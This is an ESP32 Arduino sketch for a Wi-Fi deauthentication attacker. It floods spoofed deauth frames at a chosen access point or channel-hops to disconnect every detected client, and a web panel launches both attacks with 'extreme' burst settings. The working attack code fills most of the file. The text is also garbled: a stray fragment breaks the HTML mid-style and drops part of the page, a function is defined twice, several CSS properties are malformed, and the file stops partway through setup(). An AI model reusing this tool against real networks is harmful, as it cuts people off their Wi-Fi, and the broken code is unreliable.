// This is a manually combined version of the .ino file and its header files.
// This version includes previous fixes and the updated web interface design,
// FIXES the issue where HTML string concatenation syntax was visible on the web page,
// implements a NON-BLOCKING loop for a responsive web interface during attacks (if stable),
// and pushes attack parameters to their ABSOLUTE EXTREME LIMITATION for packet injection.
//
// *** ABSOLUTE EXTREME STABILITY WARNING: These parameters are HIGHLY AGGRESSIVE ***
// *** and WILL likely cause frequent crashes, watchdog timer resets, and highly ***
// *** unstable or non-functional behavior on your specific ESP32 board. Use   ***
// *** with EXTREME caution and only on your own controlled test networks.     ***
//
// This is generally NOT the recommended way to structure an Arduino project
// with multiple files. The standard practice is to keep headers (.h) separate
// from the main sketch (.ino) and implementation files (.cpp) and use #include
// directives.
//
// Use this file with EXTREME caution. It is likely HIGHLY unstable, less maintainable
// and readable than the original multi-file structure.

#include <Arduino.h> // Included for Arduino functions like Serial, pinMode, digitalWrite, delay, millis
#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h> // Included for the web server functionality
#include <esp_log.h> // Included for logging control


// --- Content from definitions.h ---
// #ifndef DEFINITIONS_H // Include guards removed
// #define DEFINITIONS_H

#define AP_SSID "don't mind me"
#define AP_PASS "@suckmydickplease"
#define LED 2 // Define LED pin if used
#define SERIAL_DEBUG // Define to enable Serial debug prints
#define CHANNEL_MAX 13 // Max WiFi channel (usually 13 or 14 depending on region)

// --- MODIFIED: ABSOLUTE EXTREME ATTACK STRENGTH PARAMETERS ---
// *** WARNING: These values are likely BEYOND the point of stable operation. ***
#define NUM_FRAMES_PER_DEAUTH 1024 // Greatly increased frames per burst (pushing to 1024)
#define DEAUTH_ATTACK_INTERVAL_MS 0 // Minimum possible interval between bursts (already 0)
#define CHANNEL_HOP_INTERVAL_MS 5 // Minimum practical interval between channel hops (pushing to 5ms)

#define DEAUTH_BLINK_TIMES 2 // How many times to blink the LED per deauth burst
#define DEAUTH_BLINK_DURATION 20 // Duration of each LED blink in milliseconds

// Define attack types
#define DEAUTH_TYPE_SINGLE 0 // Attack a specific network (broadcast flood)
#define DEAUTH_TYPE_ALL 1 // Attack all networks by channel hopping (reactive)

// Conditional debugging macros
#ifdef SERIAL_DEBUG
#define DEBUG_PRINT(...) Serial.print(__VA_ARGS__)
#define DEBUG_PRINTLN(...) Serial.println(__VA_ARGS__)
#define DEBUG_PRINTF(...) Serial.printf(__VA_ARGS__)
#endif
#ifndef SERIAL_DEBUG
#define DEBUG_PRINT(...)
#define DEBUG_PRINTLN(...)
#define DEBUG_PRINTF(...)
#endif

// Conditional LED blinking macro
#ifdef LED
void blink_led(int num_times, int blink_duration) {
  // pinMode(LED, OUTPUT) is handled in setup()
  for (int i = 0; i < num_times; i++) {
    digitalWrite(LED, HIGH);
    delay(blink_duration / 2); // Use delay here is fine, this is a small blocking call for feedback
    digitalWrite(LED, LOW);
    delay(blink_duration / 2);
  }
}
#endif

// Function declaration for blink_led (implementation is below in the main code)
void blink_led(int num_times, int blink_duration);

// #endif // DEFINITIONS_H // Include guard removed
// --- End of definitions.h content ---


// --- Content from types.h ---
// #ifndef TYPES_H // Include guards removed
// #define TYPES_H

// Structure for a basic Deauthentication frame
typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 }; // Type/Subtype: Management (0), Deauthentication (1100)
  uint8_t duration[2]; // Duration/ID field
  uint8_t station[6]; // Destination MAC address (STA to deauth, use FF:FF:FF:FF:FF:FF for broadcast)
  uint8_t sender[6]; // Source MAC address (usually BSSID of AP - spoofed)
  uint8_t access_point[6]; // BSSID (MAC of the AP - spoofed)
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF }; // Sequence/Fragment number
  uint16_t reason; // Reason code for deauthentication
} deauth_frame_t;

// Basic MAC header structure (simplified for sniffing relevant fields)
typedef struct {
  uint16_t frame_ctrl; // Frame Control field
  uint16_t duration;
  uint8_t dest[6]; // Destination address (DA)
  uint8_t src[6]; // Source address (SA)
  uint8_t bssid[6]; // BSSID address
  uint16_t sequence_ctrl; // Sequence Control field
  // Note: This struct might need addr4[6] depending on frame type (e.g., WDS)
  // For simplicity in sniffing, we might only need up to bssid.
  // The original code had addr4, keeping it for compatibility with the sniffer usage:
  uint8_t addr4[6]; // Address 4 (if present, e.g., in WDS)
} mac_hdr_t;

// Structure representing a full Wi-Fi packet header + payload
typedef struct {
  mac_hdr_t hdr; // The MAC header
  uint8_t payload[0]; // Placeholder for the payload (variable length)
} wifi_packet_t;

// Filter configuration for promiscuous mode
const wifi_promiscuous_filter_t filt = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA // Capture management and data frames
};

// #endif // TYPES_H // Include guard removed
// --- End of types.h content ---


// --- Content from deauth.h ---
// #ifndef DEAUTH_H // Include guards removed
// #define DEAUTH_H

// #include <Arduino.h> // Already included at the top

// Function declarations for deauth control (implementations are below)
void start_deauth(int wifi_number, int attack_type, uint16_t reason);
void stop_deauth();

// External declarations for global variables defined in the main .ino file
// These tell the compiler that these variables exist elsewhere.
extern int eliminated_stations; // Note: This counter is not very accurate in broadcast modes
extern int deauth_type;

// #endif // Deauth_H // Include guard removed
// --- End of deauth.h content ---


// --- Content from web_interface.h ---
// #ifndef WEB_INTERFACE_H // Include guards removed
// #define WEB_INTERFACE_H

// Function declarations for web interface handling (implementations are below)
void start_web_interface();
void web_interface_handle_client(); // Declaration for the function used in loop()

// #endif // WEB_INTERFACE_H // Include guard removed
// --- End of web_interface.h content ---


// --- Global variables from the original .ino snippet + New timing variables ---
// These are the *definitions* of the variables declared as 'extern' in headers
deauth_frame_t deauth_frame; // Requires definition of deauth_frame_t (now included from types.h content)
int deauth_type = -1; // Initialize to non-attack state
int eliminated_stations = 0; // Initialize counter (might not be accurate in broadcast mode)
int curr_channel = 1; // Current channel for DEAUTH_TYPE_ALL

// Web server instance
WebServer server(80);
int num_networks = 0; // Global variable to store the number of scanned networks

// --- NEW: Timing variables for non-blocking attack ---
unsigned long lastDeauthBurstTime = 0;
unsigned long lastChannelHopTime = 0;
// --- END NEW ---

// Note: The 'filt' variable is defined in the types.h content block above.
// --- End of global variables ---


// Helper function to get human-readable encryption type string
String getEncryptionType(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
    // case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK"; // May not be available in older SDKs
    // case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2_WPA3_PSK"; // May not be available in older SDKs
    case WIFI_AUTH_MAX: return "Unknown";
    default: return "UNKNOWN";
  }
}

// External C function declaration for promiscuous mode sanity check bypass
// The definition might be provided elsewhere by the SDK or handled by linker script.
// Removed explicit definition from here to avoid multiple definition errors.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

// Function to blink an LED, conditionally compiled based on the LED macro
#ifdef LED
void blink_led(int num_times, int blink_duration) {
  // pinMode(LED, OUTPUT) is handled in setup()
  for (int i = 0; i < num_times; i++) {
    digitalWrite(LED, HIGH);
    delay(blink_duration / 2); // Use delay here is fine, this is a small blocking call for feedback
    digitalWrite(LED, LOW);
    delay(blink_duration / 2);
  }
}
#endif

// Function declaration for blink_led (implementation is below in the main code)
void blink_led(int num_times, int blink_duration);

// The sniffer function definition - handles received Wi-Fi packets in promiscuous mode
// IRAM_ATTR attribute places the function in IRAM for faster execution
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    // This function runs in an interrupt context! Keep it very short and fast.
    // Avoid complex logic, memory allocation, or blocking calls (like Serial.print, delay).

  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  // Cast payload to wifi_packet_t structure (requires definition of wifi_packet_t)
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  // Get the MAC header part (requires definition of mac_hdr_t)
  const mac_hdr_t *mac_header = &packet->hdr;

  // Length sanity check (can be minimal)
  if (raw_packet->rx_ctrl.sig_len < sizeof(mac_hdr_t)) return;

  // --- MODIFIED SNIFFER LOGIC ---
  // Sniffer still needed to keep promiscuous mode alive on the target channel (SINGLE)
  // or for reactive sending (ALL).
  if (deauth_type == DEAUTH_TYPE_ALL) {
    // For deauthing all stations (channel hopping), react to client packets (Data frames)
    // Check if it's a Data frame (Type 2, Subtype 0-15)
    // Check if destination is the BSSID (sent to AP) and not broadcast
    if ((type == WIFI_PKT_DATA) && (memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      // Copy relevant MAC addresses to the deauth frame template
      memcpy(deauth_frame.station, mac_header->src, 6); // Station is the packet source (client)
      memcpy(deauth_frame.access_point, mac_header->dest, 6); // AP is the packet destination (AP BSSID)
      memcpy(deauth_frame.sender, mac_header->dest, 6); // Sender is the AP (faking from AP)

      // Send a burst of deauth frames. Sending from IRAM might improve timing.
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
           // Use WIFI_IF_STA here because DEAUTH_TYPE_ALL puts us in STA mode for hopping
          esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      }

      // DEBUG_PRINTF is blocking! Avoid in IRAM sniffer unless absolutely necessary for critical debugging.
      // DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X (DEAUTH_ALL)\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);

      // BLINK_LED calls delay, which is blocking. Avoid in IRAM sniffer.
      // BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);

      // eliminated_stations++; // Incrementing a variable is generally safe in IRAM/ISR

    } // else return; // Ignore packets that don't match the criteria for reactive deauth
  }
  // --- END MODIFIED SNIFFER ---

  // Note: Eliminated stations counter is less meaningful in broadcast attacks.
  // It's also incremented rapidly in ALL mode based on observed packets, not successful deauths.
}

// The start_deauth function definition - configures Wi-Fi and starts the attack
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  // Reset counters/state
  eliminated_stations = 0;
  deauth_type = attack_type; // Set the attack type
  curr_channel = 1; // Reset channel counter for ALL mode

  // Set common deauth frame fields (reason is set per attack start)
  deauth_frame.reason = reason; // Set the reason code
  deauth_frame.frame_control[0] = 0xC0; // Type: Management (00), Subtype: Deauthentication (1100)
  deauth_frame.frame_control[1] = 0x00; // Protocol version (00)

  // Stop any ongoing WiFi operations that might interfere
  WiFi.disconnect();
  WiFi.softAPdisconnect();
  delay(50); // Short delay for modes to change

  // Ensure promiscuous mode callback is set before enabling the mode
  // This prevents potential issues if packets arrive immediately upon enabling
  esp_wifi_set_promiscuous_rx_cb(&sniffer);

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // Single target deauth (stronger: target broadcast)
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    // Validate wifi_number index before accessing WiFi.SSID
    if (wifi_number >= 0 && num_networks > 0 && wifi_number < num_networks) {
        DEBUG_PRINTLN(WiFi.SSID(wifi_number));

        // Set up a fake AP with the target network's details for sending deauths
        // This allows sending deauth frames from the target's BSSID using WIFI_IF_AP
        // Use the target BSSID and a dummy SSID/PASS to allow the AP interface to function
        WiFi.softAP(AP_SSID, AP_PASS); // AP_SSID/PASS from definitions.h
        esp_wifi_set_channel(WiFi.channel(wifi_number), WIFI_SECOND_CHAN_NONE); // Set channel to target's channel

        // Set BSSID and Sender MAC in the deauth frame to the target AP's BSSID
        memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6); // AP MAC is target BSSID
        memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6); // Sender is target BSSID (faking)

        // Target the broadcast address FF:FF:FF:FF:FF:FF instead of waiting for client MACs
        uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(deauth_frame.station, broadcast_mac, 6); // Deauth destination is broadcast

        DEBUG_PRINTF("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", deauth_frame.access_point[0], deauth_frame.access_point[1], deauth_frame.access_point[2], deauth_frame.access_point[3], deauth_frame.access_point[4], deauth_frame.access_point[5]);
        DEBUG_PRINTLN("Targeting broadcast address FF:FF:FF:FF:FF:FF");

         // Enable promiscuous mode and set up the sniffer callback
        esp_wifi_set_promiscuous(true);
        // Set the filter to only capture Management and Data frames (defined in types.h)
        esp_wifi_set_promiscuous_filter(&filt);

        lastDeauthBurstTime = millis(); // Initialize timer for the loop sending

    } else {
         DEBUG_PRINTLN("Error: Invalid network number for single target attack.");
         deauth_type = -1; // Reset attack state if invalid number
    }


  } else if (deauth_type == DEAUTH_TYPE_ALL) {
    // Deauth all stations - disables the fake AP and switches to STA mode for channel hopping
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations (channel hopping)!");
    WiFi.mode(WIFI_MODE_STA); // Switch to STA mode for channel hopping

    // In DEAUTH_TYPE_ALL, the sniffer will populate deauth_frame fields reactively per packet.
    // The loop() handles channel switching.

    // Enable promiscuous mode and set up the sniffer callback
    esp_wifi_set_promiscuous(true);
    // Set the filter to only capture Management and Data frames (defined in types.h)
    esp_wifi_set_promiscuous_filter(&filt);

    lastChannelHopTime = millis(); // Initialize timer for channel hopping

  } else {
      DEBUG_PRINTLN("Error: start_deauth called with invalid attack type.");
      deauth_type = -1; // Ensure state is invalid
  }
}

// The stop_deauth function definition - stops the attack and disables promiscuous mode
void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false); // Disable promiscuous mode FIRST
  esp_wifi_set_promiscuous_rx_cb(NULL); // Deregister the sniffer callback
  // Give the system a moment to stop promiscuous mode completely
  delay(50);

  // Return to AP mode and restart the access point for the web interface
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
  DEBUG_PRINT("Access Point ");
  DEBUG_PRINT(AP_SSID);
  DEBUG_PRINTLN(" started");
  DEBUG_PRINT("IP address: ");
  DEBUG_PRINTLN(WiFi.softAPIP());

  deauth_type = -1; // Reset deauth type to indicate no attack is running
  curr_channel = 1; // Reset channel counter
  num_networks = 0; // Reset network scan count (optional, can rescan on root)
  eliminated_stations = 0; // Reset counter
}


// Helper function to redirect to the root page
void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(303); // Use 303 See Other for POST redirects, or 302 Found
}

// Helper function to check if a string is a valid non-negative integer
bool isValidNumber(String str) {
    if (str.length() == 0) return false;
    for (uint i = 0; i < str.length(); i++) {
        if (!isDigit(str.charAt(i))) {
            return false;
        }
    }
    return true;
}


// Web server request handler for root ("/")
void handle_root() {
  // Ensure deauth_type is correctly reflected on page load
  if (deauth_type != DEAUTH_TYPE_SINGLE && deauth_type != DEAUTH_TYPE_ALL) {
       deauth_type = -1;
  }

  // --- UPDATED WEB INTERFACE DESIGN (HTML/CSS) ---
  // --- FIX START: Corrected HTML string concatenation for dynamic content ---
  String html = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32 Deauther</title>
    <style>
        /* --- General Styling --- */
        body {
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; /* Modern font stack */
            line-height: 1.6;
            color: #e0e0e0; /* Light grey text on dark background */
            max-width: 800px;
            margin: 20px auto;
            padding: 0 15px; /* Adjusted padding */
            background: linear-gradient(135deg, #222 0%, #333 60%, #444 100%); /* Smoother dark gradient */
            min-height: 100vh;
            box-sizing: border-box;
        }

        *, *:before, *:after {
            box-sizing: inherit;
        }

        h1, h2 {
            color: #ff8a65; /* Soft orange/red */
            text-align: center;
            margin-bottom: 20px;
            margin-top: 25px; /* Adjusted spacing */
            font-weight: 600; /* Slightly bolder headers */
        }
         h1 { margin-top: 0; font-size: 2.2em; }
         h2 { font-size: 1.6em; border-bottom: 2px solid rgba(255,138,101,0.3); padding-bottom: 5px; }


        /* --- Container Styling --- */
        .container {
            background-color: rgba(255, 255, 255, 0.08); /* Semi-transparent white */
            backdrop-filter: blur(5px); /* Optional: Frosted glass effect */
            border: 1px solid rgba(255, 255, 255, 0.1); /* Subtle border */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); /* Subtler shadow */
            margin-bottom: 25px;
            color: #eee; /* Light text inside container */
            overflow: hidden;
        }


        /* --- Table Styling --- */
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            table-layout: auto;
            font-size: 0.9em; /* Slightly smaller font for table */
        }

        th, td {
            padding: 10px; /* Slightly less padding */
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1); /* Lighter, semi-transparent border */
            word-break: break-word;
        }

        th {
            background-color: rgba(255,138,101,0.1); /* Light orange/red background */
            color: #ff8a65; /* Match header color */
            font-weight: 600;
        }

        tr:nth-child(even) {
            background-color: rgba(255, 255, 255, 0.03); /* Very subtle stripe */
        }

        tr:hover {
            background-color: rgba(255, 255, 255, 0.05); /* Subtle hover effect */
        }

        .table-container {
            overflow-x: auto;
        }


        /* --- Form Styling --- */
        form {
           /* styles are now handled by the .container class */
           margin-bottom: 0;
        }

        input[type="text"], input[type="number"] {
            display: block;
            width: 100%;
            padding: 10px; /* Adjusted padding */
            margin-bottom: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2); /* Subtle border */
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 1rem;
            background-color: rgba(0, 0, 0, 0.2); /* Dark input background */
            color: #eee; /* Light input text */
            transition: border-color 0.3s ease;
        }
         input[type="text"]:focus, input[type="number"]:focus {
            outline: none;
            border-color: #ff8a65; /* Highlight on focus */
        }

        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
         input[type="number"] { -moz-appearance: textfield; }


        /* --- Button Styling --- */
        input[type="submit"] {
            display: block;
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: none;
            border-radius: 4校长：）html";
            // Conditionally add the max attribute
            if (num_networks > 0) {
               html += " max=\"" + String(num_networks - 1) + "\"";
            }
            html += R"html(>
            <input type="number" name="reason" placeholder="Reason code (e.g., 1)" value="1" required min="0" max="24">
            <input type="submit" value="Launch Single Attack">
        </form>
         </div>

    <div class="container">
        <h2>Launch Deauth Attack (All Stations/Channel Hopping)</h2>
         <p>Cycles through channels and sends deauths to any detected client.</p>
        <form method="post" action="/deauth_all">
            <input type="number" name="reason" placeholder="Reason code (e.g., 1)" value="1" required min="0" max="24">
            <input type="submit" value="Deauth All">
        </form>
         <p>Note: This mode hops channels. The web interface will remain responsive (if device is stable).</p>
    </div>


    <div class="container reason-codes-table">
        <h2>Reason Codes</h2>
            <table>
                <tr>
                    <th>Code</th>
                    <th>Meaning</th>
                </tr>
                <tr><td>0</td><td>Reserved.</td></tr>
                <tr><td>1</td><td>Unspecified reason.</td></tr>
                <tr><td>2</td><td>Previous authentication no longer valid.</td></tr>
                <tr><td>3</td><td>Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.</td></tr>
                <tr><td>4</td><td>Disassociated due to inactivity.</td></tr>
                <tr><td>5</td><td>Disassociated because WAP device is unable to handle all currently associated STAs.</td></tr>
                <tr><td>6</td><td>Class 2 frame received from nonauthenticated STA.</td></tr>
                <tr><td>7</td><td>Class 3 frame received from nonassociated STA.</td></tr>
                <tr><td>8</td><td>Disassociated because sending STA is leaving or has left Basic Service Set (BSS).</td></tr>
                <tr><td>9</td><td>STA requesting (re)association is not authenticated with responding STA.</td></tr>
                <tr><td>10</td><td>Disassociated because the information in the Power Capability element is unacceptable.</td></tr>
                <tr><td>11</td><td>Disassociated because the information in the Supported Channels element is unacceptable.</td></tr>
                <tr><td>12</td><td>Disassociated due to BSS Transition Management.</td></tr>
                <tr><td>13</td><td>Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.</td></tr>
                <tr><td>14</td><td>Message integrity code (MIC) failure.</td></tr>
                <tr><td>15</td><td>4-Way Handshake timeout.</td></tr>
                <tr><td>16</td><td>Group Key Handshake timeout.</td></tr>
                <tr><td>17</td><td>Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.</td></tr>
                <tr><td>18</td><td>Invalid group cipher.</td></tr>
                <tr><td>19</td><td>Invalid pairwise cipher.</td></tr>
                <tr><td>20</td><td>Invalid AKMP.</td></tr>
                <tr><td>21</td><td>Unsupported RSNE version.</td></tr>
                <tr><td>22</td><td>Invalid RSNE capabilities.</td></tr>
                <tr><td>23</td><td>IEEE 802.1X authentication failed.</td></tr>
                <tr><td>24</td><td>Cipher suite rejected because of the security policy.</td></tr>
            </table>
    </div>

</body>
</html>
)html";
  // --- FIX END: Corrected HTML string concatenation ---

  server.send(200, "text/html", html);
}

// Web server request handler for /deauth (POST)
void handle_deauth() {
  String net_num_str = server.arg("net_num");
  String reason_str = server.arg("reason");

  String html = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauth Attack Status</title>
     <style>
        /* Reusing styles from root for consistency */
        body {
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #222 0%, #333 60%, #444 100%);
            color: #eee; /* Light default text */
        }
        .alert {
            background-color: rgba(76, 175, 80, 0.9); /* Green with transparency */
            color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.4); /* Subtler shadow */
            text-align: center;
            max-width: 400px;
            width: 90%;
             border: 1px solid rgba(255, 255, 255, 0.15); /* Subtle border */
        }
        .alert.error {
            background-color: rgba(244, 67, 54, 0.9); /* Red with transparency */
        }
         .alert.warning {
            background-color: rgba(255, 152, 0, 0.9); /* Orange with transparency */
        }
         .alert h2 {
            color: white;
            text-shadow: none;
            margin-top: 0;
            margin-bottom: 10px;
             border-bottom: none;
             padding-bottom: 0;
             font-size: 1.6em; /* Match main h2 size */
        }
        .alert p {
            margin-bottom: 0;
            font-size: 1.1em;
            opacity: 0.9;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 30px;
            background: linear-gradient(90deg, #2196F3 0%, #1976D2 100%); /* Blue gradient */
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            font-size: 1em;
        }
        .button:hover {
            background: linear-gradient(90deg, #1976D2 0%, #2196F3 100%);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <div class="alert)html";

  // Basic validation: Check if inputs are valid numbers and network number is in range
  if (isValidNumber(net_num_str) && isValidNumber(reason_str)) {
      int wifi_number = net_num_str.toInt();
      uint16_t reason = reason_str.toInt();

      if (wifi_number >= 0 && num_networks > 0 && wifi_number < num_networks) {
        html += R"html( ">
            <h2>Starting Deauth Attack!</h2>
            <p>Deauthenticating network number: )html" + String(wifi_number) + R"html(</p>
            <p>Reason code: )html" + String(reason) + R"html(</p>
            <a href="/" class="button">Back to Home</a>
        </div>)html";
        // Call the start_deauth function with parameters
        start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
      } else {
        // --- UPDATED ERROR STRING/MESSAGE ---
        String errorMessage = "Invalid Network Number. ";
        if (num_networks <= 0) {
            errorMessage += "No networks scanned yet. Please go back and Rescan.";
        } else {
            errorMessage += "Number " + String(wifi_number) + " is out of range (0 to " + String(num_networks - 1) + ").";
        }
        html += R"html( error">
            <h2>Error</h2>
            <p>)" + errorMessage + R"html(</p>
            <a href="/" class="button">Back to Home</a>
        </div>)html";
         // --- END UPDATED ERROR STRING/MESSAGE ---
      }
  } else {
       html += R"html( error">
            <h2>Error</h2>
            <p>Invalid input for network number or reason code.</p>
            <a href="/" class="button">Back to Home</a>
        </div>)html";
  }

  html += R"html(
</body>
</html>
)html";

  server.send(200, "text/html", html);
}

// Web server request handler for /deauth_all (POST)
void handle_deauth_all() {
  String reason_str = server.arg("reason");

    // --- UPDATED WEB INTERFACE DESIGN (HTML/CSS for status pages) ---
    // --- FIX START: Corrected HTML string concatenation for dynamic content ---
  String html = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauth All Networks Status</title>
    <style>
        /* Reusing styles from root for consistency */
        body {
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #222 0%, #333 60%, #444 100%);
            color: #eee; /* Light default text */
        }
        .alert {
            background-color: rgba(255, 152, 0, 0.9); /* Orange with transparency */
            color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.4);
            text-align: center;
            max-width: 450px;
            width: 90%;
             border: 1px solid rgba(255, 255, 255, 0.15);
        }
         .alert h2 {
            color: white;
            text-shadow: none;
            margin-top: 0;
             margin-bottom: 15px;
             border_bottom: none;
             padding-bottom: 0;
             font_size: 1.6em;
        }
         .alert p {
            margin_bottom: 0;
            font_size: 1.1em;
            opacity: 0.9;
        }
         .button { /* Added button style for consistency if needed, though none used on this page */
            display: inline-block;
            padding: 10px 20px;
            margin_top: 30px;
            background: linear-gradient(90deg, #2196F3 0%, #1976D2 100%); /* Blue gradient */
            color: white;
            text_decoration: none;
            border_radius: 5px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box_shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            font_size: 1em;
        }
        .button:hover {
            background: linear-gradient(90deg, #1976D2 0%, #2196F3 100%);
            box_shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <div class="alert warning">
        )html";

    if (isValidNumber(reason_str)) {
        uint16_t reason = reason_str.toInt();
        html += R"html(
            <h2>Starting Deauth Attack on All Networks!</h2>
            <p>WiFi will now cycle through channels sending deauth frames.</p>
            <p>The web interface will remain responsive (if device is stable).</p>
            <p>Reason code: )html" + String(reason) + R"html(</p>
        )html";
        // Call the start_deauth function for all networks attack
        // The '0' for wifi_number is arbitrary here as attack_type is DEAUTH_TYPE_ALL
        start_deauth(0, DEAUTH_TYPE_ALL, reason);
    } else {
         html += R"html(
            <h2>Error</h2>
            <p>Invalid input for reason code.</p>
         )html";
    }


  html += R"html(
    </div>
</body>
</html>
)html";
    // --- FIX END: Corrected HTML string concatenation ---

  server.send(200, "text/html", html);
  // start_deauth is called inside the if(isValidNumber) block
}

// Web server request handler for /rescan (POST)
void handle_rescan() {
  if (deauth_type != -1) {
      // If attack is running, stop it before scanning
      DEBUG_PRINTLN("Attack active, stopping before rescan.");
      stop_deauth();
      // Add a small delay to allow mode change
      delay(200);
  }

  // Perform a new WiFi scan and update the global count
  WiFi.mode(WIFI_STA); // Ensure in STA mode for scanning
  WiFi.disconnect(); // Disconnect if connected
  delay(100); // Small delay
  DEBUG_PRINTLN("Scanning networks...");
  num_networks = WiFi.scanNetworks(); // Synchronous scan
  DEBUG_PRINTF("Found %d networks\n", num_networks);

  // Return to AP mode after scan
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS); // Restart AP for web interface
  DEBUG_PRINT("Access Point ");
  DEBUG_PRINT(AP_SSID);
  DEBUG_PRINTLN(" started");
  DEBUG_PRINT("IP address: ");
  DEBUG_PRINTLN(WiFi.softAPIP());

  redirect_root(); // Redirect back to the home page to display updated list
}

// Web server request handler for /stop (POST)
void handle_stop() {
  // Stop the deauth attack
  stop_deauth();
  redirect_root(); // Redirect back to the home page
}


// Function to start the web interface
void start_web_interface() {
  // Configure web server routes and handlers
  server.on("/", HTTP_GET, handle_root); // Handle GET requests for root
  server.on("/deauth", HTTP_POST, handle_deauth); // Handle POST requests for /deauth
  server.on("/deauth_all", HTTP_POST, handle_deauth_all); // Handle POST requests for /deauth_all
  server.on("/rescan", HTTP_POST, handle_rescan); // Handle POST requests for /rescan
  server.on("/stop", HTTP_POST, handle_stop); // Handle POST requests for /stop

  // Start the web server
  server.begin();
#ifdef SERIAL_DEBUG // Print status to serial if debug is enabled
  Serial.println("HTTP server started");
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
#endif
}

// Function to handle web server clients in the main loop
void web_interface_handle_client() {
  server.handleClient();
}


// Standard Arduino setup function - runs once on boot
void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
  DEBUG_PRINTLN("Serial started");
#endif

  // --- FIX: Suppress noisy WiFi logs (Kept from previous fix) ---
  // Setting to ERROR might suppress even more WiFi internal messages.
  esp_log_level_set("wifi", ESP_LOG_ERROR); // Set log level for WiFi component to ERROR
  // --- END FIX ---


#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  // Set up ESP32 as an Access Point for the web interface
  WiFi.mode(WIFI_MODE_AP);
  // Ensure AP is running for web interface access initially
  WiFi.softAP(AP_SSID, AP_PASS);

#ifdef SERIAL_DEBUG
